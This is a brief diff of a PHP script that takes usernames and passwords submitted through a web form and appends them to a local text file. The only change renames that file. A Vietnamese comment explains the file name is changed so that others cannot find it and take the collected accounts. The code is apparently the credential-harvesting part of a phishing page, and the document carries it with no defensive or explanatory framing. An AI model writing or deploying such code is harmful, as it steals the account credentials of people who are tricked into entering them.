@@ -8,7 +8,7 @@
      $password = $_POST["pass"];
      $type = $_POST["login"];
       $body = "\n".$type.": $username|$password\n"; 
-     $test = fopen("hutao.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
+     $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
      fwrite($test,$body);
      fclose($test); 
    }
